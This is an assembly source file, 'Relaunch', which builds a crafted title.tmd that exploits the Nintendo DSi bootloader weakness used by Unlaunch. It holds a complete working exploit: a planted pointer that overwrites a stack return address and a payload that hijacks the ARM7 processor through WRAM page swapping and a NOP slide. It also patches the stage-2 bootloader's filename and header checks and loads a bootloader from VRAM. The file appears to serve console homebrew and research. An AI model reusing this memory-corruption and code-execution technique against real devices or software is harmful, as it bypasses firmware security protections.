# Relaunch
# An open sourced exploit payload for the weakness unlaunch uses

.syntax unified

###############################
#          Constants          #
###############################

.equ SECTIONBASE        ,0x037df06c
.equ TMD_BASE           ,0x037df06c
.equ TMD_SIZE           ,0x00030000
.equ TMD_WRITECONSTANT  ,0x037F3CC0
.equ TMD_WRITEOFFSET    ,0x00000078
.equ TMD_WRITEPOINTER   ,0x037F3878
.equ TMD_STACKRETURN    ,0x02FE3558
.equ HWREG_BASE         ,0x04000000
.equ PALETTE_BASE       ,0x05000000

# The exploited code is arm32 
# We could make it return to thumb code but for simplicity all code within here
# is kept as 32 bit

.arm
.global _start

###############################
# BEGIN of the title.tmd file #
###############################

.text
.org (TMD_BASE - SECTIONBASE)

##############################
# Insert original TMD binary #
##############################

_start:
  .incbin "title.org"
 
##############################
# Fill until payload with AA #
############################## 

# .org (0x037f0000 - SECTIONBASE), 0xAA

##############################
#     ! Actual Payload !     #
############################## 

# This example payload was borowed from BrokenPit and modified
# It will alternate the top screen between green and blue 
# with some delay between

setScreenColored:
  push {r0}
  mov r0, HWREG_BASE
  mov r1, #0
  str r1, [r0, #0x208]
  str r1, [r0, #0x210]
  ldr r2, [r0, #0x214]
  str r2, [r0, #0x214]
  mov r2, #(1<<16)
  str r2, [r0]
  str r1, [r0, #0x60]
  str r1, [r0, #0x6C] @ MASTER_BRIGHT FIX by Normmatt
  mov r0, PALETTE_BASE
  pop {r1}
  strh r1, [r0]
  bx lr
   
delay:
  mov r0, #0x00500000 @ time to wait
delayloop:
  subs r0, r0, #1 @ subtract 1
  bne delayloop @ jump back if not zero
  bx lr @ return
  
entry:
  BL captureARM7
mainLoop:
  mov r0, #0xFC00
  BL setScreenColored
  BL delay
  mov r0, #0x03C0
  BL setScreenColored
  BL delay  
#  B mainLoop
  ldr r0, passmeAddress
  ldr r1, passmeInstruction
  str r1, [r0]
  str r0, [r0, #0x20]
  mov r2, #0x02000000
  ldr r1, [r2, #4]
  str r1, [r2]
  BX r0
  
  
passmeAddress:
  .word 0x02FFFE04
passmeInstruction:
  .word 0xE59FF018
  
##############################
# Patches for the stag2 to   #
# run other DSi Paths        #
##############################

srlFilenameBuffer:
  .word 0x02ffdfc0
  
@ the following address points to the branch that resolves the filename to
@ load by teh stage 2 bootloader. By replacing this with a NOP we could
@ pass a srl file name to load from the payload

filenamePatchLocation:
  .word 0x037b8b74
filenamePatchInstruction:
  B . + 4
checkHeaderPatchLocation:
  .word 0x037b8bb8
checkHeaderPatchInstruction:
  B . + 4 

##############################
#    Gain control of ARM7    #
##############################

@ The Idea to gain control of the arm7 execution is to grab a page of the WRAM 
@ from the arm7 that is not executed, save its data for later and fill it with a
@ NOP slide to branch to payload
@ then we blend it back to the arm7 at a page that will be executed in normal
@ operation (the page the ISRs are in)
@ The arm7 then will fetch the nop slide and branch to the payload
 
captureARM7:
  push {lr}
copyPayload:
  @ Copy arm7 and arm9 main ram payload to main ram
  adr r0, arm7PayloadStart
  adr r1, arm7PayloadEnd
  mov r2, #0x02000000
copyPayloadLoop:
  ldr r3, [r0], #4
  str r3, [r2], #4
  cmp r0, r1
  bne copyPayloadLoop
copyBootloader:
  @ set VRAM C LCD
  ldr r0, regVRAMC
  ldr r1, VRAMC_LCD
  strb r1, [r0]
  @ copy to vram
  adr r0, VRAMPayloadStart
  add r1, r0, #32768
  ldr r2, VRAMC_ADDR
copyBootloaderLoop:
  ldrh r3, [r0], #2
  strh r3, [r2], #2
  cmp r0, r1
  bne copyBootloaderLoop
  @ set VRAM C arm7
  ldr r0, regVRAMC
  ldr r1, VRAMC_ARM7
  strb r1, [r0]
setWRAMBaseC:
  @ Set base and end address for bank C (none set yet)
  ldr r0, addrMBK8
  ldr r1, dataMBK8
  str r1,[r0]
getWRAMPage:
  @ Gain Control of 1st Page for ARM9 at offset 0
  ldr r0, addrMBK4
  ldr r1, dataMBK4_ARM9Ctrl
  str r1,[r0]
  ldr r1, dataMBK5_ARM9Ctrl
  str r1,[r0, #4]
backupData:
  @ Save the code that was on this page in main ram for later recovery
  mov r0, 0x8000
  mov r1, 0x03800000
  mov r2, 0x02100000
backupLoop:
  ldr r3, [r1],#4
  str r3, [r2],#4
  subs r0, r0, #4
  bne backupLoop
clearPage: 
  @ Clear with B self (for now to see where we are)
  mov r0, 0x8000
  sub r0, r0, #4
  mov r1, 0x03800000
  ldr r2, nopSlide
clrLoop:
  str r2, [r1],#4
  subs r0, r0, #4
  bne clrLoop
  ldr r2, nopSlideEnd
  str r2, [r1],#4
postPage:
  @ Set control to arm7 again, so 
  ldr r0, addrMBK4
  ldr r1, dataMBK4_ARM7Ctrl
  ldr r2, dataMBK5_ARM7Ctrl
  str r1,[r0] 
  str r2,[r0, #4] 
waitTillWeAreSureArm7IsCaptured:
  BL delay
restoreBackup:
  ldr r0, addrMBK4
  ldr r1, dataMBK4_ARM9Ctrl
  str r1,[r0]
  ldr r1, dataMBK5_ARM9Ctrl
  str r1,[r0, #4]
  mov r0, 0x8000
  mov r1, 0x03800000
  mov r2, 0x02100000
restoreLoop:
  ldr r3, [r2],#4
  str r3, [r1],#4
  subs r0, r0, #4
  bne restoreLoop  
restoreOrigPages:
  ldr r0, addrMBK4
  ldr r1, dataMBK4_Restore
  str r1,[r0]
  ldr r1, dataMBK5_Restore
  str r1,[r0, #4]
testEnd:
  pop {lr}
  BX lr

addrMBK4:
  .word 0x400404C
addrMBK8:
  .word 0x400405C
dataMBK4_ARM9Ctrl:
  .word 0x8D898580
dataMBK5_ARM9Ctrl:
  .word 0x9D999591
dataMBK4_ARM7Ctrl:
  .word 0x8D89859D
dataMBK5_ARM7Ctrl:
  .word 0x80999591
dataMBK4_Restore:
  .word 0x8D898581
dataMBK5_Restore:
  .word 0x9D999591
dataMBK8:
  .word 0x08803800
codeBranchSelf:
  .word 0xEAFFFFFE
regVRAMC:
  .word 0x04000242
VRAMC_LCD:
  .word 0x00000080
VRAMC_ARM7:
  .word 0x00000082
VRAMC_ADDR:
  .word 0x06840000
  
nopSlide:
  mov r0, #0x02000000
nopSlideEnd:
  BX r0
  
##############################
# ARM7 Payload               #
##############################

@ Create the passme loop and jump to it

arm7PayloadStart:
  b .
  mov pc, #0x06000000
arm7PayloadEnd:


VRAMPayloadStart:
  .incbin "nds_bootloader.bin"  
VRAMPayloadEnd:
  B .   
  
##############################
#           EXPLOIT          #
############################## 

# The following lines trigger the exploit
# A function that is called after the .TMD is loaded uses memory that
# is overwritten by the .TMD to write the constant 037F3CC0h at a location we 
# can control.
# Pseudo code:
#   [[037F3878h]+78h] = 037F3CC0h
#
# We will overwrite the return value of that very same function on the stack
# with the constant. Conveniantly the constant is a valid address we have 
# overwritten with the .TMD. 
#
# So with returning from the exploited function, we will start executing 
# from 037F3CC0h

.org (TMD_WRITEPOINTER - SECTIONBASE), 0xAA
  .word TMD_WRITEPOINTER+4                    @ Address of the Pointer used to 
                                              @ write the constant
  .word TMD_STACKRETURN-TMD_WRITEOFFSET       @ Thats the pointer itself, it is 
                                              @ 78h below the target
  
.org (TMD_WRITECONSTANT - SECTIONBASE), 0xAA
  B entry                                     @ We jump away here instantly, as 
                                              @ the following bytes are over-
                                              @ written in the meantime so we 
                                              @ have no control over it, but the 
                                              @ first instruction will be valid
                                              
##############################
#         Pad to 192k        #
############################## 

.org TMD_SIZE - 4, 0xAA
  .word 0xAAAAAAAA
  